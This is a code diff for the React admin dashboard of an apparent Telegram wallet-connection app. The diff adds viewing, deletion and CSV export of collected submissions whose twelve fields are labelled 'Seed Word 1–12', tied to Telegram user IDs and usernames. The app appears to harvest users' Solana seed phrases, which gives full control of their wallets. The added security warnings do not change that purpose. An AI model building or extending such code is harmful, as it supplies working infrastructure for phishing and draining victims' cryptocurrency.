@@ -5,10 +5,14 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Input } from "@/components/ui/input";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Badge } from "@/components/ui/badge";
-import { Search, Shield, Download, Users } from "lucide-react";
+import { Search, Shield, Download, Users, Eye, Trash2, AlertTriangle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { format } from "date-fns";
 import { TelegramNavigation } from "@/components/TelegramNavigation";
+import { AdminStats } from "@/components/admin/AdminStats";
+import { SubmissionDetailDialog } from "@/components/admin/SubmissionDetailDialog";
+import { DeleteConfirmDialog } from "@/components/admin/DeleteConfirmDialog";
+import { useToast } from "@/hooks/use-toast";
 
 interface WalletConnection {
   id: string;
@@ -36,6 +40,9 @@ const Admin = () => {
   const [filteredConnections, setFilteredConnections] = useState<WalletConnection[]>([]);
   const [searchTerm, setSearchTerm] = useState("");
   const [loading, setLoading] = useState(true);
+  const [selectedSubmission, setSelectedSubmission] = useState<WalletConnection | null>(null);
+  const [deleteSubmissionId, setDeleteSubmissionId] = useState<string | null>(null);
+  const { toast } = useToast();
 
   useEffect(() => {
     if (isAdmin) {
@@ -74,13 +81,17 @@ const Admin = () => {
   };
 
   const exportToCSV = () => {
+    if (!window.confirm("⚠️ WARNING: This CSV contains sensitive Solana wallet seed phrases. Ensure secure handling and storage. Continue?")) {
+      return;
+    }
+
     const headers = [
       "ID",
       "Telegram User ID",
       "Username",
       "First Name",
       "Created At",
-      ...Array.from({ length: 12 }, (_, i) => `Field ${i + 1}`)
+      ...Array.from({ length: 12 }, (_, i) => `Seed Word ${i + 1}`)
     ];
 
     const csvData = filteredConnections.map(conn => [
@@ -111,9 +122,51 @@ const Admin = () => {
     const url = window.URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = `wallet-connections-${format(new Date(), "yyyy-MM-dd")}.csv`;
+    a.download = `SENSITIVE-wallet-data-${format(new Date(), "yyyy-MM-dd")}.csv`;
     a.click();
+    
+    toast({
+      title: "Export Complete",
+      description: "Remember to store this file securely and delete it when no longer needed.",
+      variant: "destructive",
+    });
   };
+
+  const handleDelete = async () => {
+    if (!deleteSubmissionId) return;
+
+    try {
+      const { error } = await supabase
+        .from("wallet_connections")
+        .delete()
+        .eq("id", deleteSubmissionId);
+
+      if (error) throw error;
+
+      toast({
+        title: "Deleted",
+        description: "Submission has been permanently deleted.",
+      });
+
+      fetchConnections();
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Failed to delete submission. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setDeleteSubmissionId(null);
+    }
+  };
+
+  const verifiedCount = connections.filter(c => c.telegram_user_id).length;
+  const recentCount = connections.filter(c => {
+    const createdAt = new Date(c.created_at);
+    const yesterday = new Date();
+    yesterday.setDate(yesterday.getDate() - 1);
+    return createdAt > yesterday;
+  }).length;
 
   if (isLoading || loading) {
     return (
@@ -133,13 +186,14 @@ const Admin = () => {
   return (
     <div className="min-h-screen bg-background pb-24">
       <div className="max-w-7xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
+        {/* Header */}
         <Card className="bg-card/50 backdrop-blur-sm mb-6">
           <CardHeader>
             <div className="flex items-center gap-3">
               <Shield className="w-6 h-6 text-primary" />
               <div className="flex-1">
                 <CardTitle className="text-xl sm:text-2xl">Admin Dashboard</CardTitle>
-                <CardDescription>Manage wallet connection submissions</CardDescription>
+                <CardDescription>Secure wallet connection management</CardDescription>
               </div>
               <Badge variant="secondary" className="gap-2">
                 <Users className="w-3 h-3" />
@@ -148,6 +202,28 @@ const Admin = () => {
             </div>
           </CardHeader>
         </Card>
+
+        {/* Stats */}
+        <div className="mb-6">
+          <AdminStats
+            totalSubmissions={connections.length}
+            verifiedSubmissions={verifiedCount}
+            recentSubmissions={recentCount}
+          />
+        </div>
+
+        {/* Security Warning */}
+        <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 mb-6">
+          <div className="flex items-start gap-3">
+            <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
+            <div>
+              <h3 className="font-semibold text-sm text-destructive mb-1">Admin Security Notice</h3>
+              <p className="text-xs text-muted-foreground">
+                You are viewing sensitive Solana wallet data. All access is logged. Never share, screenshot, or export this data to unsecured locations.
+              </p>
+            </div>
+          </div>
+        </div>
 
         <Card className="bg-card/50 backdrop-blur-sm">
           <CardHeader>
@@ -178,13 +254,14 @@ const Admin = () => {
                     <TableHead>User ID</TableHead>
                     <TableHead>Created At</TableHead>
                     <TableHead>Status</TableHead>
-                    <TableHead className="text-right">Seed Phrase Fields</TableHead>
+                    <TableHead className="text-right">Completion</TableHead>
+                    <TableHead className="text-right">Actions</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {filteredConnections.length === 0 ? (
                     <TableRow>
-                      <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">
+                      <TableCell colSpan={6} className="text-center py-8 text-muted-foreground">
                         No submissions found
                       </TableCell>
                     </TableRow>
@@ -228,6 +305,24 @@ const Admin = () => {
                               .filter(f => f?.trim()).length} / 12
                           </Badge>
                         </TableCell>
+                        <TableCell className="text-right">
+                          <div className="flex items-center justify-end gap-2">
+                            <Button
+                              variant="ghost"
+                              size="icon"
+                              onClick={() => setSelectedSubmission(conn)}
+                            >
+                              <Eye className="h-4 w-4" />
+                            </Button>
+                            <Button
+                              variant="ghost"
+                              size="icon"
+                              onClick={() => setDeleteSubmissionId(conn.id)}
+                            >
+                              <Trash2 className="h-4 w-4 text-destructive" />
+                            </Button>
+                          </div>
+                        </TableCell>
                       </TableRow>
                     ))
                   )}
@@ -237,7 +332,22 @@ const Admin = () => {
           </CardContent>
         </Card>
       </div>
+      
       <TelegramNavigation />
+
+      {/* Modals */}
+      <SubmissionDetailDialog
+        submission={selectedSubmission}
+        open={!!selectedSubmission}
+        onClose={() => setSelectedSubmission(null)}
+      />
+      
+      <DeleteConfirmDialog
+        open={!!deleteSubmissionId}
+        onClose={() => setDeleteSubmissionId(null)}
+        onConfirm={handleDelete}
+        submissionId={deleteSubmissionId}
+      />
     </div>
   );
 };
